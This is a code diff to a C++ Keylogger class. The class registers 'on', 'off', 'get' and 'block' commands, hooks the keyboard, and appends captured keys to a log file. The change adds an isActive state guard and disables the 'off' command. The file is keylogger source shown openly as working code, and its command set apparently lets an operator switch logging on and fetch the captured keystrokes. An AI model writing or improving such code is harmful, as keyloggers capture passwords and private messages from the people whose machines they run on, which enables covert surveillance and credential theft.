@@ -13,13 +13,12 @@ Keylogger::Keylogger() {
 		}
 	});
 	CommandParser::addCommand("on", [this](std::string argStr) {
-		this->stop();
 		this->start();
 		return "Logging started successfully";
 	});
 	CommandParser::addCommand("off", [this](std::string argStr) {
-		this->stop();
-		return "Logging stopped";
+		//this->stop();
+		return "Not working for now";
 	});
 	CommandParser::addCommand("get", [this](std::string argStr) {
 		logFile.close();
@@ -34,16 +33,21 @@ Keylogger::Keylogger() {
 	CommandParser::addCommand("block", [this](std::string argStr) {
 		return "Not implemented now";
 	});
+
+	
+	this->isActive = false;
+	hook = make_shared<Hook>();
 }
 
 void Keylogger::start() {
-	
-	hook = make_shared<Hook>();
-	hook->setHook([this](const wchar_t key[]) {
-		keyboardHandler(key);
-	});
+	if (!this->isActive) {
+		hook->setHook([this](const wchar_t key[]) {
+			keyboardHandler(key);
+		});
 
-	logFile.open(FILENAME, std::ios::app);
+		logFile.open(FILENAME, std::ios::app);
+		this->isActive = true;
+	}
 }
 
 void Keylogger::keyboardHandler(const wchar_t* keyText) {
@@ -92,8 +96,11 @@ void Keylogger::addWindowTimeStamps() {
 }
 
 void Keylogger::stop() {
-	hook->unsetHook();
-	logFile.close();
+	if (this->isActive) {
+		hook->unsetHook();
+		logFile.close();
+		this->isActive = false;
+	}
 }
 
 Keylogger::~Keylogger() {
